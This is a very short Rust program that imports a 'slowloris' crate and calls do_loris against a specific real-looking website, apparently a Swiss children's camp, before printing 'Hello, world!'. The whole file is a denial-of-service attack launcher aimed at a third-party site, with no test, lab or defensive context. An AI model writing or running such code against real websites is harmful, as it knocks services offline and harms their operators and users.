extern crate slowloris;

fn main() {
    slowloris::do_loris("https://www.kinderlagerhischwil.ch/").unwrap();
    println!("Hello, world!");
}
